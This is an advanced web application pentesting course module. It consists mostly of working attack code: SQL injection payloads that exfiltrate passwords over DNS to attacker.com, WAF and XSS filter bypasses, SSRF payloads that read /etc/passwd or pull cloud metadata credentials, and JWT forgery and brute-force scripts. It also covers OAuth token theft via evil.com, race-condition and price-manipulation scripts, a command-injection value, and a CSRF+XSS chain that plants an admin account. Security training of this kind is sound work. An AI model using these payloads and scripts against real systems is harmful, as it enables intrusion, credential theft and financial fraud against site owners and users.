# 📚 Module 3.1: Advanced Web Application Security

> **Duration:** Week 1-2 (8-10 hours)  
> **Prerequisites:** Level 2 Complete  
> **Difficulty:** 🔴 Advanced

## 🎯 Learning Objectives

By the end of this module, you will be able to:
- Identify and exploit advanced web application vulnerabilities beyond OWASP Top 10
- Chain multiple vulnerabilities to create complex attack scenarios
- Bypass modern web application security controls and filters
- Perform advanced authentication and authorization attacks
- Exploit business logic flaws and race conditions
- Conduct comprehensive API security assessments
- Develop custom tools and exploits for specific vulnerabilities

---

## 🌐 Advanced Web Application Threat Landscape

### 🔍 Beyond OWASP Top 10

While the OWASP Top 10 covers the most common vulnerabilities, advanced attackers focus on:

```
Traditional Vulnerabilities → Advanced Exploitation Techniques
        (OWASP Top 10)      →     (APT-Style Attacks)
```

#### **Advanced Vulnerability Categories**
1. **Business Logic Flaws** - Application-specific vulnerabilities in workflows
2. **Race Conditions** - Time-based vulnerabilities in concurrent operations
3. **Type Confusion** - Exploiting language-specific type handling
4. **Prototype Pollution** - JavaScript object manipulation attacks
5. **Template Injection** - Server-side template engine exploitation
6. **Deserialization Attacks** - Object serialization vulnerabilities
7. **GraphQL Injection** - Query language specific attacks
8. **API Security Flaws** - REST/GraphQL/gRPC vulnerabilities

---

## 🔓 Advanced Injection Techniques

### 💉 SQL Injection Evolution

#### **Blind SQL Injection Mastery**

**Time-Based Blind SQLi:**
```sql
-- Boolean-based blind detection
' AND (SELECT COUNT(*) FROM users) > 0 --

-- Time-based blind detection
' AND (SELECT SLEEP(5)) --
' AND (SELECT PG_SLEEP(5)) --
' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('test',5) FROM dual) --

-- Advanced time-based payload
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)))>64 THEN SLEEP(5) ELSE 0 END) --
```

**DNS Exfiltration Techniques:**
```sql
-- DNS exfiltration (MySQL)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE id=1), '.attacker.com\\test.txt')) --

-- DNS exfiltration (MSSQL)
'; EXEC master.dbo.xp_dirtree '\\' + (SELECT password FROM users WHERE id=1) + '.attacker.com\test' --

-- DNS exfiltration (PostgreSQL)
'; COPY (SELECT password FROM users WHERE id=1) TO PROGRAM 'nslookup ' || (SELECT password FROM users WHERE id=1) || '.attacker.com' --
```

**Advanced Filter Bypass Techniques:**
```sql
-- WAF bypass using encoding
%27%20UNION%20SELECT%20null%2Cnull%2Cnull--
%2527%2520UNION%2520SELECT%2520null%252Cnull%252Cnull--

-- Comment-based bypass
/*!50000UNION*/ /*!50000SELECT*/ null,null,null--
/*! UNION */ /*! SELECT */ null,null,null--

-- Case variation bypass
UnIoN SeLeCt null,null,null--
union/**/select/**/null,null,null--

-- Alternative operators
' || (SELECT password FROM users WHERE id=1) || '
' + (SELECT password FROM users WHERE id=1) + '
' CONCAT((SELECT password FROM users WHERE id=1)) '

-- Using functions to obfuscate
CHAR(85,78,73,79,78)  -- Spells "UNION"
UNHEX('554E494F4E')    -- Spells "UNION"
```

#### **NoSQL Injection Techniques**

**MongoDB Injection:**
```javascript
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Information extraction
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
{"username": {"$regex": "^a"}, "password": {"$ne": null}}

// JavaScript injection
{"username": "admin", "password": {"$where": "return true"}}
{"username": "admin", "password": {"$where": "this.username == 'admin'"}}
```

**Redis Injection:**
```bash
# Command injection through EVAL
EVAL "return redis.call('SET', KEYS[1], ARGV[1])" 1 "key" "value"

# Data extraction
EVAL "return redis.call('GET', 'sensitive_key')" 0

# System command execution (if enabled)
EVAL "return os.execute('whoami')" 0
```

### 🔧 Advanced XSS Exploitation

#### **DOM-Based XSS Advanced Techniques**

**Source and Sink Analysis:**
```javascript
// Dangerous sources
location.href
location.search
location.hash
document.referrer
window.name
postMessage events

// Dangerous sinks
eval()
setTimeout()
setInterval()
Function()
document.write()
element.innerHTML
element.outerHTML
```

**Advanced DOM XSS Payloads:**
```javascript
// Hash-based DOM XSS
http://vulnerable-site.com/page.html#<script>alert('XSS')</script>

// PostMessage DOM XSS
window.postMessage('<script>alert("XSS")</script>', '*');

// Angular.js template injection
{{constructor.constructor('alert(1)')()}}
{{$new.constructor.constructor('alert(1)')()}}

// Vue.js template injection
{{constructor.constructor('alert(1)')()}}

// Prototype pollution to DOM XSS
Object.prototype.innerHTML = '<script>alert("XSS")</script>';
```

**Advanced XSS Filter Bypasses:**
```javascript
// Event handler bypasses
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

// JavaScript protocol bypasses
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)"></iframe>

// Data URI bypasses
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<object data="data:text/html,<script>alert(1)</script>"></object>

// CSS-based XSS
<style>@import'data:,*{xss:expression(alert(1))}'</style>
<link rel=stylesheet href=data:,*{xss:expression(alert(1))}>

// Unicode and encoding bypasses
\u003cscript\u003ealert(1)\u003c/script\u003e
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;
```

### 🔗 Advanced CSRF and SSRF

#### **CSRF with SameSite Bypass**

**SameSite=Lax Bypass:**
```html
<!-- Method 1: Top-level navigation -->
<a href="https://vulnerable-site.com/csrf-endpoint?action=delete&id=123">Click here for free gift!</a>

<!-- Method 2: Popup window -->
<script>
window.open('https://vulnerable-site.com/csrf-endpoint?action=delete&id=123');
</script>

<!-- Method 3: Meta refresh -->
<meta http-equiv="refresh" content="0; url=https://vulnerable-site.com/csrf-endpoint?action=delete&id=123">
```

**SameSite=Strict Bypass:**
```javascript
// Only possible with XSS or subdomain control
// Subdomain cookie injection
document.cookie = "session=attacker_session; domain=.vulnerable-site.com; path=/";

// Then perform CSRF from subdomain
fetch('https://vulnerable-site.com/csrf-endpoint', {
    method: 'POST',
    credentials: 'include',
    body: 'action=delete&id=123'
});
```

#### **Advanced SSRF Techniques**

**Bypass Filters and Restrictions:**
```bash
# IP address bypasses
http://127.0.0.1:8080/admin
http://localhost:8080/admin
http://0.0.0.0:8080/admin
http://[::1]:8080/admin
http://2130706433:8080/admin  # Decimal format of 127.0.0.1

# Domain bypasses
http://evil.com@127.0.0.1:8080/admin
http://127.0.0.1.evil.com:8080/admin
http://whitelisted-domain.com.evil.com:8080/admin

# Protocol bypasses
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/info
ftp://127.0.0.1:21/
ldap://127.0.0.1:389/

# DNS rebinding
http://rebinding.attack.com  # Resolves to internal IP after DNS TTL expires
```

**Cloud Metadata Exploitation:**
```bash
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2017-08-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Google Cloud metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

---

## 🔐 Advanced Authentication and Authorization Attacks

### 🎫 Advanced Session Management Attacks

#### **JWT (JSON Web Token) Exploitation**

**Algorithm Confusion Attacks:**
```python
import jwt
import base64
import hmac

# Original JWT (RS256)
original_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."

# Decode header and payload
header = jwt.get_unverified_header(original_token)
payload = jwt.decode(original_token, options={"verify_signature": False})

# Change algorithm to HS256
header['alg'] = 'HS256'
payload['admin'] = True

# Get public key (usually available at /.well-known/jwks.json)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQE...
-----END PUBLIC KEY-----"""

# Create new token using public key as HMAC secret
new_token = jwt.encode(payload, public_key, algorithm='HS256', headers=header)
```

**None Algorithm Attack:**
```python
import jwt
import json
import base64

# Decode original token
original_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."
payload = jwt.decode(original_token, options={"verify_signature": False})

# Modify payload
payload['admin'] = True

# Create header with 'none' algorithm
header = {"typ": "JWT", "alg": "none"}

# Manually create token
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# None algorithm tokens end with empty signature
malicious_token = f"{header_encoded}.{payload_encoded}."
```

**JWT Secrets Brute Force:**
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# Using john the ripper
john jwt_token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Using custom Python script
import jwt
import itertools
import string

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# Brute force short secrets
for length in range(1, 8):
    for secret in itertools.product(string.ascii_lowercase, repeat=length):
        secret_str = ''.join(secret)
        try:
            jwt.decode(token, secret_str, algorithms=['HS256'])
            print(f"Secret found: {secret_str}")
            break
        except:
            continue
```

#### **OAuth 2.0 Advanced Attacks**

**Authorization Code Interception:**
```javascript
// Vulnerable redirect_uri validation
// Original: https://client.com/callback
// Attack: https://client.com.evil.com/callback
// Attack: https://client.com/callback/../../../evil.com/steal
// Attack: https://client.com@evil.com/callback

// CSRF on OAuth flow
<img src="https://auth-server.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://client.com/callback&response_type=code&state=PREDICTABLE_STATE">

// State parameter bypass
// If state validation is missing or weak
https://auth-server.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://evil.com&response_type=code
```

**Access Token Leakage:**
```javascript
// Referer header leakage
<a href="https://evil.com" target="_blank">
    <img src="https://api.service.com/user/profile?access_token=LEAKED_TOKEN">
</a>

// PostMessage token theft
// In OAuth popup window
window.opener.postMessage(access_token, '*');

// Fragment identifier leakage
// If using implicit flow
https://client.com/callback#access_token=TOKEN&token_type=bearer
// Token visible in server logs, browser history, referer headers
```

### 🔑 Advanced Password Attack Techniques

#### **Timing Attacks on Authentication**

**Username Enumeration via Timing:**
```python
import requests
import time
import statistics

def timing_attack(username):
    times = []
    for i in range(10):
        start = time.time()
        r = requests.post('https://target.com/login', 
                         data={'username': username, 'password': 'wrongpassword'})
        end = time.time()
        times.append(end - start)
    
    return statistics.mean(times)

# Test different usernames
test_users = ['admin', 'user', 'nonexistent', 'test', 'guest']
for user in test_users:
    avg_time = timing_attack(user)
    print(f"{user}: {avg_time:.4f}s")
```

**Password Reset Token Attacks:**
```python
# Token entropy analysis
import requests
import re

def analyze_reset_tokens():
    tokens = []
    for i in range(100):
        r = requests.post('https://target.com/reset-password', 
                         data={'email': f'test{i}@evil.com'})
        # Extract token from email or response
        token = re.search(r'token=([a-zA-Z0-9]+)', r.text)
        if token:
            tokens.append(token.group(1))
    
    # Analyze patterns
    print(f"Collected {len(tokens)} tokens")
    print(f"Average length: {sum(len(t) for t in tokens) / len(tokens)}")
    print(f"Character set: {''.join(set(''.join(tokens)))}")
    
    # Check for time-based patterns
    import hashlib
    for token in tokens[:10]:
        print(f"Token: {token}")
        # Check if timestamp-based
        for timestamp in range(1600000000, 1700000000, 3600):
            if hashlib.md5(str(timestamp).encode()).hexdigest()[:len(token)] == token:
                print(f"  Possible timestamp: {timestamp}")
```

---

## 🏗️ Business Logic Vulnerabilities

### 💰 E-commerce Logic Flaws

#### **Price Manipulation Attacks**

**Negative Quantity Attack:**
```javascript
// Manipulate quantity to negative value
{
    "items": [
        {"id": "expensive_item", "quantity": 1, "price": 1000},
        {"id": "cheap_item", "quantity": -10, "price": 10}
    ]
}
// Total: 1000 + (-100) = 900 (should be 1100)
```

**Currency Manipulation:**
```javascript
// Change currency after price calculation
POST /api/cart/add
{
    "item_id": "laptop",
    "quantity": 1,
    "currency": "USD"  // Price calculated in USD
}

POST /api/cart/checkout
{
    "currency": "IDR"  // Change to Indonesian Rupiah (if not recalculated)
}
// $1000 USD becomes 1000 IDR (~$0.07)
```

**Coupon/Discount Abuse:**
```javascript
// Apply same coupon multiple times
POST /api/cart/apply-coupon
{
    "coupon_code": "SAVE50",
    "cart_id": "123"
}

// Race condition - multiple simultaneous requests
for (let i = 0; i < 10; i++) {
    fetch('/api/cart/apply-coupon', {
        method: 'POST',
        body: JSON.stringify({
            "coupon_code": "SAVE50",
            "cart_id": "123"
        })
    });
}
```

#### **Race Condition Exploitation**

**Bank Transfer Race Condition:**
```python
import threading
import requests

def transfer_money():
    requests.post('https://bank.com/transfer', 
                 data={
                     'from_account': '123456',
                     'to_account': '654321',
                     'amount': '1000'
                 },
                 cookies={'session': 'user_session'})

# Launch multiple simultaneous transfers
threads = []
for i in range(10):
    t = threading.Thread(target=transfer_money)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**Inventory Management Race Condition:**
```javascript
// Simultaneous purchase of limited item
async function buyLimitedItem() {
    const response = await fetch('/api/purchase', {
        method: 'POST',
        body: JSON.stringify({
            'item_id': 'limited_edition',
            'quantity': 1
        })
    });
    return response.json();
}

// Launch multiple simultaneous purchases
Promise.all([
    buyLimitedItem(),
    buyLimitedItem(),
    buyLimitedItem(),
    buyLimitedItem(),
    buyLimitedItem()
]);
```

### 🔄 Workflow Manipulation

#### **State Machine Attacks**

**Order Processing Bypass:**
```python
# Normal flow: cart -> checkout -> payment -> confirmed -> shipped
# Attack: Skip payment verification

import requests

# Step 1: Add items to cart
requests.post('/api/cart/add', json={'item': 'laptop', 'qty': 1})

# Step 2: Create order
order_response = requests.post('/api/orders/create')
order_id = order_response.json()['order_id']

# Step 3: Skip payment, directly mark as paid
requests.post(f'/api/orders/{order_id}/status', 
              json={'status': 'paid'})

# Step 4: Request shipping
requests.post(f'/api/orders/{order_id}/ship')
```

**Account Privilege Escalation:**
```javascript
// Normal flow: register -> verify email -> basic user
// Attack: Manipulate verification process

// Step 1: Register account
fetch('/api/register', {
    method: 'POST',
    body: JSON.stringify({
        'email': 'attacker@evil.com',
        'password': 'password123',
        'role': 'admin'  // Attempt direct role assignment
    })
});

// Step 2: Intercept verification token for another user
// Through timing attacks, enumeration, or social engineering

// Step 3: Use stolen token with our account
fetch('/api/verify-email', {
    method: 'POST',
    body: JSON.stringify({
        'email': 'attacker@evil.com',
        'token': 'stolen_admin_token'
    })
});
```

---

## 🌐 API Security Advanced Attacks

### 📊 GraphQL Security Testing

#### **GraphQL Introspection and Information Disclosure**

**Schema Introspection:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
      fields {
        name
        description
        args {
          name
          type {
            name
            kind
          }
        }
        type {
          name
          kind
        }
      }
    }
    mutationType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

**Field Suggestion Attack:**
```graphql
# Try variations of field names to discover hidden fields
query {
  user(id: 1) {
    id
    name
    email
    # Try these variations:
    # password, passwordHash, passwd, pwd
    # isAdmin, admin, role, permissions
    # ssn, socialSecurityNumber, creditCard
    # internalNotes, comments, remarks
  }
}
```

**GraphQL Injection Attacks:**
```graphql
# SQL injection through GraphQL
query {
  user(id: "1' UNION SELECT password FROM admins-- ") {
    id
    name
  }
}

# NoSQL injection
query {
  user(filter: {name: {$ne: null}}) {
    id
    name
    email
  }
}

# OS command injection
mutation {
  updateUser(id: 1, name: "test; whoami; #") {
    id
    name
  }
}
```

**GraphQL DoS Attacks:**
```graphql
# Query depth attack
query {
  user(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    # ... continue nesting
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# Query complexity attack
query {
  users(first: 1000) {
    posts(first: 1000) {
      comments(first: 1000) {
        author {
          id
          name
          email
        }
      }
    }
  }
}

# Alias-based amplification
query {
  user1: user(id: 1) { name }
  user2: user(id: 1) { name }
  user3: user(id: 1) { name }
  # ... repeat for hundreds of aliases
}
```

### 🔗 REST API Advanced Attacks

#### **HTTP Parameter Pollution (HPP)**

**Server-Side HPP:**
```bash
# Different servers handle duplicate parameters differently
# Apache: Uses last value
# Nginx: Uses first value
# IIS: Concatenates with comma

# Attack example
POST /api/transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=1&to_account=attacker&amount=1000000&to_account=victim

# Depending on server:
# - Amount: 1 or 1000000
# - Destination: attacker or victim
```

**Client-Side HPP:**
```javascript
// URL: /search?category=electronics&category=<script>alert('XSS')</script>
// Client-side JavaScript might process both parameters

const urlParams = new URLSearchParams(window.location.search);
const categories = urlParams.getAll('category');
// categories = ['electronics', '<script>alert(\'XSS\')</script>']

// If used in innerHTML without sanitization:
document.getElementById('results').innerHTML = 
    `Searching in categories: ${categories.join(', ')}`;
```

#### **REST API Mass Assignment**

**Mass Assignment Attack:**
```python
import requests

# Discover available fields through error messages or documentation
# Then attempt to modify protected fields

# Normal user update
normal_data = {
    'name': 'John Doe',
    'email': 'john@example.com'
}

# Mass assignment attack
attack_data = {
    'name': 'John Doe',
    'email': 'john@example.com',
    'role': 'admin',           # Privilege escalation
    'is_verified': True,       # Skip verification
    'credit_balance': 1000000, # Financial manipulation
    'user_id': 1              # Attempt to modify different user
}

# Send malicious request
response = requests.put('/api/users/profile', json=attack_data)
```

---

## 🔧 Advanced Tools and Techniques

### 🛠️ Custom Tool Development

#### **Advanced Burp Suite Extensions**

**Custom Authentication Handler:**
```python
from burp import IBurpExtender, IHttpListener
import json
import base64

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Advanced Auth Handler")
        callbacks.registerHttpListener(self)
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            self.handle_request(messageInfo)
        else:
            self.handle_response(messageInfo)
    
    def handle_request(self, messageInfo):
        request = messageInfo.getRequest()
        requestInfo = self._helpers.analyzeRequest(request)
        
        # Auto-refresh JWT tokens
        headers = requestInfo.getHeaders()
        for i, header in enumerate(headers):
            if header.startswith("Authorization: Bearer "):
                token = header.split(" ")[2]
                if self.is_token_expired(token):
                    new_token = self.refresh_token()
                    headers[i] = f"Authorization: Bearer {new_token}"
                    
        # Rebuild request with new headers
        new_request = self._helpers.buildHttpMessage(headers, 
                                                   request[requestInfo.getBodyOffset():])
        messageInfo.setRequest(new_request)
    
    def is_token_expired(self, token):
        try:
            # Decode JWT payload
            payload = token.split('.')[1]
            # Add padding if needed
            payload += '=' * (4 - len(payload) % 4)
            decoded = json.loads(base64.b64decode(payload))
            
            # Check expiration
            import time
            return decoded.get('exp', 0) < time.time()
        except:
            return True
    
    def refresh_token(self):
        # Implement token refresh logic
        return "new_jwt_token_here"
```

#### **Advanced Payload Generation**

**Context-Aware XSS Payloads:**
```python
import re

class AdvancedXSSGenerator:
    def __init__(self):
        self.contexts = {
            'html': self.generate_html_payloads,
            'attribute': self.generate_attribute_payloads,
            'javascript': self.generate_js_payloads,
            'css': self.generate_css_payloads,
            'url': self.generate_url_payloads
        }
    
    def detect_context(self, response_body, injection_point):
        # Analyze where our input appears in the response
        patterns = {
            'html': r'<[^>]*>' + re.escape(injection_point) + r'[^<]*</',
            'attribute': r'<[^>]*\s+\w+=["\']?[^"\']*' + re.escape(injection_point),
            'javascript': r'<script[^>]*>.*?' + re.escape(injection_point) + r'.*?</script>',
            'css': r'<style[^>]*>.*?' + re.escape(injection_point) + r'.*?</style>',
            'url': r'https?://[^"\s]*' + re.escape(injection_point)
        }
        
        for context, pattern in patterns.items():
            if re.search(pattern, response_body, re.IGNORECASE | re.DOTALL):
                return context
        return 'html'  # Default
    
    def generate_html_payloads(self):
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ]
    
    def generate_attribute_payloads(self):
        return [
            '" onmouseover="alert(\'XSS\')" "',
            '\' onmouseover=\'alert("XSS")\' \'',
            '"><script>alert("XSS")</script>',
            '\'/><script>alert("XSS")</script>',
            'javascript:alert("XSS")'
        ]
    
    def generate_js_payloads(self):
        return [
            '\';alert("XSS");//',
            '\";alert("XSS");//',
            '</script><script>alert("XSS")</script>',
            '${alert("XSS")}',  # Template literals
            '`${alert("XSS")}`'
        ]
    
    def generate_context_aware_payload(self, response_body, injection_point):
        context = self.detect_context(response_body, injection_point)
        return self.contexts[context]()
```

### 🔍 Advanced Reconnaissance for Web Apps

#### **Technology Stack Fingerprinting**

**Advanced Header Analysis:**
```python
import requests
import re

class WebTechFingerprinter:
    def __init__(self):
        self.signatures = {
            'frameworks': {
                'Laravel': [
                    {'header': 'Set-Cookie', 'pattern': r'laravel_session'},
                    {'header': 'X-Powered-By', 'pattern': r'PHP'},
                    {'response': 'body', 'pattern': r'csrf_token'}
                ],
                'Django': [
                    {'header': 'Set-Cookie', 'pattern': r'csrftoken'},
                    {'header': 'Set-Cookie', 'pattern': r'sessionid'},
                    {'response': 'body', 'pattern': r'__admin_media_prefix__'}
                ],
                'Ruby on Rails': [
                    {'header': 'Set-Cookie', 'pattern': r'_.*_session'},
                    {'header': 'X-Powered-By', 'pattern': r'Phusion Passenger'},
                    {'response': 'body', 'pattern': r'authenticity_token'}
                ]
            },
            'servers': {
                'Apache': [
                    {'header': 'Server', 'pattern': r'Apache'},
                    {'header': 'X-Powered-By', 'pattern': r'mod_'},
                ],
                'Nginx': [
                    {'header': 'Server', 'pattern': r'nginx'},
                ],
                'IIS': [
                    {'header': 'Server', 'pattern': r'Microsoft-IIS'},
                    {'header': 'X-Powered-By', 'pattern': r'ASP\.NET'},
                ]
            }
        }
    
    def fingerprint(self, url):
        response = requests.get(url)
        results = {'frameworks': [], 'servers': [], 'technologies': []}
        
        for category, technologies in self.signatures.items():
            for tech_name, signatures in technologies.items():
                for signature in signatures:
                    if self.check_signature(response, signature):
                        results[category].append(tech_name)
                        break
        
        return results
    
    def check_signature(self, response, signature):
        if signature.get('header'):
            header_value = response.headers.get(signature['header'], '')
            return bool(re.search(signature['pattern'], header_value, re.IGNORECASE))
        elif signature.get('response') == 'body':
            return bool(re.search(signature['pattern'], response.text, re.IGNORECASE))
        return False
```

#### **Advanced Directory Discovery**

**Smart Wordlist Generation:**
```python
import requests
import re
from collections import defaultdict

class SmartWordlistGenerator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.discovered_words = set()
        self.technologies = []
    
    def analyze_existing_content(self):
        # Crawl known pages and extract words
        pages_to_crawl = ['/', '/index.html', '/about', '/contact']
        
        for page in pages_to_crawl:
            try:
                response = requests.get(f"{self.target_url}{page}")
                words = self.extract_words(response.text)
                self.discovered_words.update(words)
                
                # Extract technology-specific patterns
                self.extract_tech_patterns(response.text)
            except:
                continue
    
    def extract_words(self, content):
        # Extract meaningful words from HTML content
        # Remove HTML tags
        text = re.sub(r'<[^>]+>', ' ', content)
        
        # Extract words (alphanumeric, 3+ chars)
        words = re.findall(r'\b[a-zA-Z0-9]{3,}\b', text.lower())
        
        # Filter common words
        common_words = {'the', 'and', 'for', 'are', 'but', 'not', 'you', 'all', 'can', 'had', 'her', 'was', 'one', 'our', 'out', 'day', 'get', 'has', 'him', 'his', 'how', 'man', 'new', 'now', 'old', 'see', 'two', 'way', 'who', 'boy', 'did', 'its', 'let', 'put', 'say', 'she', 'too', 'use'}
        
        return [word for word in words if word not in common_words]
    
    def extract_tech_patterns(self, content):
        # Look for technology-specific file patterns
        patterns = {
            'php': [r'\.php\b', r'index\.php', r'config\.php'],
            'asp': [r'\.asp\b', r'\.aspx\b', r'default\.asp'],
            'jsp': [r'\.jsp\b', r'\.do\b'],
            'python': [r'\.py\b', r'wsgi', r'django'],
            'node': [r'\.js\b', r'package\.json', r'node_modules']
        }
        
        for tech, tech_patterns in patterns.items():
            for pattern in tech_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    self.technologies.append(tech)
                    break
    
    def generate_custom_wordlist(self):
        wordlist = set()
        
        # Add discovered words
        wordlist.update(self.discovered_words)
        
        # Add technology-specific extensions
        tech_extensions = {
            'php': ['.php', '.php3', '.php4', '.php5', '.phtml'],
            'asp': ['.asp', '.aspx', '.asmx', '.ashx'],
            'jsp': ['.jsp', '.jspx', '.do', '.action'],
            'python': ['.py', '.pyc', '.wsgi'],
            'node': ['.js', '.json']
        }
        
        # Generate variations with extensions
        base_words = ['admin', 'test', 'backup', 'config', 'login', 'user']
        
        for word in base_words:
            wordlist.add(word)
            for tech in self.technologies:
                if tech in tech_extensions:
                    for ext in tech_extensions[tech]:
                        wordlist.add(f"{word}{ext}")
        
        return sorted(list(wordlist))
```

---

## 🔧 Practical Exercise: Advanced Web Application Assessment

### **Week 1-2 Challenge: Comprehensive Advanced Web App Pentest**

#### **Phase 1: Advanced Reconnaissance (3 hours)**

**Advanced Technology Stack Analysis:**
```bash
# Multi-layer technology detection
whatweb -v -a 3 https://target.com
wappalyzer-cli https://target.com

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Advanced subdomain enumeration
subfinder -d target.com -silent | httpx -silent | tee subdomains.txt
cat subdomains.txt | waybackurls | grep -E '\.(js|json|xml|txt|log|bak|old)$' | sort -u

# JavaScript analysis for endpoints
cat subdomains.txt | subjs | grep -E '/(api|admin|test|dev)' | sort -u

# Advanced directory discovery with custom wordlists
gobuster dir -u https://target.com -w custom_wordlist.txt -x php,asp,aspx,jsp,js,json,xml,txt,bak,old -t 50
```

#### **Phase 2: Advanced Vulnerability Discovery (4 hours)**

**Business Logic Testing Checklist:**
- [ ] Race condition testing on critical functions (payments, transfers, purchases)
- [ ] Price manipulation attacks (negative quantities, currency switching)
- [ ] Workflow bypass attempts (skipping payment, verification steps)
- [ ] Mass assignment vulnerabilities in API endpoints
- [ ] Time-based attacks on authentication mechanisms

**Advanced Injection Testing:**
```bash
# Advanced SQL injection with sqlmap
sqlmap -u "https://target.com/search?q=test" --batch --level 5 --risk 3 --tamper=space2comment,charencode --random-agent

# NoSQL injection testing
# Test MongoDB operators
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# GraphQL testing
# Introspection query
echo 'query IntrospectionQuery { __schema { queryType { name fields { name } } } }' | curl -X POST -H "Content-Type: application/json" -d @- https://target.com/graphql

# Advanced XSS testing with context awareness
# Test in different contexts: HTML, attributes, JavaScript, CSS
```

**JWT Security Assessment:**
```python
# Implement JWT testing script
import jwt
import requests

def test_jwt_vulnerabilities(token):
    tests = []
    
    # Test 1: None algorithm
    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        payload['admin'] = True
        none_token = jwt.encode(payload, "", algorithm="none")
        tests.append(('none_algorithm', none_token))
    except:
        pass
    
    # Test 2: Weak secret brute force
    common_secrets = ['secret', '123456', 'password', 'admin', 'key']
    for secret in common_secrets:
        try:
            jwt.decode(token, secret, algorithms=['HS256'])
            tests.append(('weak_secret', secret))
            break
        except:
            continue
    
    # Test 3: Algorithm confusion (if you have public key)
    # Implementation depends on available public key
    
    return tests

# Test discovered JWT tokens
jwt_tokens = []  # Collect from application
for token in jwt_tokens:
    vulnerabilities = test_jwt_vulnerabilities(token)
    print(f"Token vulnerabilities: {vulnerabilities}")
```

#### **Phase 3: Advanced Exploitation (3 hours)**

**Chaining Vulnerabilities:**
```python
# Example: CSRF + XSS + Privilege Escalation Chain
import requests

# Step 1: Identify CSRF vulnerability in admin function
csrf_payload = """
<form action="https://target.com/admin/add-user" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="password123">
    <input type="hidden" name="role" value="admin">
    <input type="submit" value="Submit">
</form>
<script>document.forms[0].submit();</script>
"""

# Step 2: Use stored XSS to deliver CSRF attack
xss_payload = f"<script>document.body.innerHTML='{csrf_payload}'</script>"

# Step 3: Inject XSS payload in vulnerable field
requests.post('https://target.com/comments', 
              data={'comment': xss_payload},
              cookies={'session': 'user_session'})

# When admin views comments, CSRF executes automatically
```

**API Security Exploitation:**
```python
# Advanced API testing script
import requests
import json

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.session = requests.Session()
        if auth_token:
            self.session.headers['Authorization'] = f'Bearer {auth_token}'
    
    def test_mass_assignment(self, endpoint, normal_data):
        # Test for mass assignment vulnerabilities
        attack_fields = ['role', 'admin', 'is_admin', 'permissions', 'user_id', 'id']
        
        for field in attack_fields:
            test_data = normal_data.copy()
            test_data[field] = 'admin'
            
            response = self.session.post(f"{self.base_url}{endpoint}", 
                                       json=test_data)
            
            if response.status_code == 200:
                print(f"Potential mass assignment in field: {field}")
                print(f"Response: {response.text}")
    
    def test_idor(self, endpoint_template, user_id_range):
        # Test for Insecure Direct Object References
        for user_id in range(1, user_id_range):
            endpoint = endpoint_template.format(id=user_id)
            response = self.session.get(f"{self.base_url}{endpoint}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'email' in data or 'username' in data:
                        print(f"IDOR found: {endpoint}")
                        print(f"Exposed data: {data}")
                except:
                    pass
    
    def test_rate_limiting(self, endpoint, payload_count=100):
        # Test for rate limiting bypass
        responses = []
        for i in range(payload_count):
            response = self.session.post(f"{self.base_url}{endpoint}")
            responses.append(response.status_code)
        
        success_count = responses.count(200)
        if success_count > payload_count * 0.8:
            print(f"Rate limiting bypass possible: {success_count}/{payload_count} requests succeeded")

